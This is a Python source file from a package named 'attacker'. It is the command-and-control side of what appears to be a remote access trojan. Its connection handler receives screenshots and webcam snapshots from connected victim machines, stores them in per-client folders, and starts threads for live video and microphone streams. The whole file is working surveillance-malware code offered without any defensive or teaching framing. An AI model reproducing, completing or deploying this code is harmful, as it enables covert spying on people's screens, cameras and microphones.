import asyncore
import os
import threading
from attacker.util import *

# point to the project attacker folder (one level up from terminal package)
CURRENT_FOLDER = os.path.dirname(os.path.dirname(os.path.realpath(__file__)))

BUFFER_SNAPSHOT = 609600
BUFFER_DEFAULT = 8096
ENCODING = "Cp1252"

WEBCAM_SCRIPT = "webcam-host.py"
MICROPHONE_SCRIPT = "microphone-host.py"

WEBCAM_DIR_FMT = "webcam{client_id}"
SCREENSHOT_DIR_FMT = "screenshots{client_id}"

SNAPSHOT_NAME_FMT = "snapshot_NUM{num}.png"
SCREENSHOT_NAME_FMT = "Screenshot_ID{client_id}_NUM{num}.png"

class ConnectionHandler(asyncore.dispatcher_with_send):
    def __init__(self, sock, addr, window, iD, connections):
        asyncore.dispatcher_with_send.__init__(self, sock)
        self.window = window
        self.id = iD
        self.addr = addr
        self._connections = connections
        self._service_handlers = []
        self._encryption_handler = None

    def handle_read(self):
        global CURRENT_FOLDER
        
        # use extracted default buffer and encoding
        data = self.recv(BUFFER_DEFAULT).decode(ENCODING)
        if data == "Taken Screenshot":
            ConnectionHandler.receiving_screenshot = True
        if data == "Taken Snapshot":
            ConnectionHandler.receiving_snapshot = True
        elif data == "STARTING LIVESTREAM":
            video_thread = threading.Thread(target=ConnectionHandler.video_stream)
            video_thread.start()
        elif data == "STARTING AUDIOSTREAM":
            audio_thread = threading.Thread(target=ConnectionHandler.audio_stream)
            audio_thread.start()
        elif data != "":
            self.window.Output.addItem(f"\n{ts()} {data}")

    def handle_close(self):
        try:
            self.close()
        finally:
            self._connections.pop(self.id, None)
            self.window.Output.addItem(CONNECTION_DISCONNECT_TEMPLATE.format(time=ts(), addr=self.addr))

    def handle_expt(self):
        try:
            self.close()
        finally:
            self._connections.pop(self.id, None)
            self.window.Output.addItem(CONNECTION_LOST_TEMPLATE.format(time=ts(), addr=self.addr))
